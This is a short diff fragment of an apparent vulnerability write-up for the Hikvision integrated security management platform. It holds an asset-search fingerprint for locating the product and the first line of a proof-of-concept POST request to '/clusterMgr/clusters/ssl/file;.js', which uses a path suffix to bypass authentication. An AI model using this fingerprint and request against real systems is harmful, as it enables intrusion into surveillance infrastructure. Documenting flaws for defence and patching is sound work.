@@ -8,7 +8,7 @@
 app="HIKVISION-综合安防管理平台"
 ```
 
-## poc
+## POC
 
 ```java
 POST /clusterMgr/clusters/ssl/file;.js HTTP/1.1
